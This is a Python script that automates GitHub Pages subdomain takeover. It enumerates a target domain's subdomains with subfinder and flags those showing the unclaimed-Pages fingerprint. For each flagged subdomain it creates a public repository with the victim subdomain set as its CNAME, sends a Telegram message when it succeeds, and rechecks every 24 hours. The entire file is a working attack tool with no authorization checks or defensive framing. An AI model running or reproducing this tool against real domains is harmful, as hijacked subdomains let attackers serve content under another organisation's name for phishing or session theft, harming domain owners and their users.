import requests
import subprocess
from time import sleep
from telegram import Bot
from telegram.error import TelegramError
import os

# Function to send a Telegram message
def send_telegram_message(token, chat_id, message):
    bot = Bot(token=token)
    try:
        bot.send_message(chat_id=chat_id, text=message)
    except TelegramError as e:
        print(f"Failed to send message: {e}")

# Function to run subfinder and get subdomains
def get_subdomains(domain):
    try:
        result = subprocess.run(["subfinder", "-d", domain, "-silent"], capture_output=True, text=True)
        subdomains = result.stdout.split()
        return subdomains
    except Exception as e:
        print(f"Error running subfinder: {e}")
        return []

# Function to check if a subdomain is vulnerable to takeover on GitHub
def check_subdomain_takeover(subdomain):
    url = f"http://{subdomain}"
    try:
        response = requests.get(url)
        if "There isn't a GitHub Pages site here." in response.text:
            return True
    except requests.RequestException as e:
        print(f"Error checking subdomain {subdomain}: {e}")
    return False

# Function to attempt to take over a GitHub subdomain
def attempt_takeover(subdomain, github_token, github_username):
    repo_name = subdomain.replace('.', '-')
    headers = {
        'Authorization': f'token {github_token}',
        'Accept': 'application/vnd.github.v3+json',
    }

    # Create a new repository
    repo_url = f"https://api.github.com/user/repos"
    repo_data = {
        "name": repo_name,
        "auto_init": True,
        "private": False,
    }

    try:
        response = requests.post(repo_url, json=repo_data, headers=headers)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error creating repository: {e}")
        return False

    # Configure GitHub Pages for the repository
    pages_url = f"https://api.github.com/repos/{github_username}/{repo_name}/pages"
    pages_data = {
        "source": {
            "branch": "main",
        },
        "cname": subdomain
    }

    try:
        response = requests.post(pages_url, json=pages_data, headers=headers)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error configuring GitHub Pages: {e}")
        return False

    print(f"Successfully took over {subdomain}!")
    return True

# Main function
def main():
    domain = input("Enter the domain to check for subdomain takeover: ")
    telegram_token = input("Enter your Telegram bot token: ")
    telegram_chat_id = input("Enter your Telegram chat ID: ")
    github_token = input("Enter your GitHub personal access token: ")
    github_username = input("Enter your GitHub username: ")

    while True:
        print(f"Enumerating subdomains for {domain}...")
        subdomains = get_subdomains(domain)
        vulnerable_subdomains = []

        for subdomain in subdomains:
            if check_subdomain_takeover(subdomain):
                print(f"Subdomain {subdomain} is vulnerable to takeover!")
                if attempt_takeover(subdomain, github_token, github_username):
                    send_telegram_message(telegram_token, telegram_chat_id, f"Successfully took over subdomain: {subdomain}")
                    return  # Stop the script after successful takeover
                else:
                    vulnerable_subdomains.append(subdomain)
            else:
                print(f"Subdomain {subdomain} is not vulnerable.")
        
        if vulnerable_subdomains:
            print("Vulnerable subdomains found but could not be taken over. Checking again in 24 hours.")
            print("Press Ctrl+C to exit if you no longer want to monitor.")
            sleep(86400)  # Wait for 24 hours
        else:
            print("No vulnerable subdomains found. Exiting.")
            return  # Exit the script if no vulnerable subdomains are found

if __name__ == "__main__":
    main()
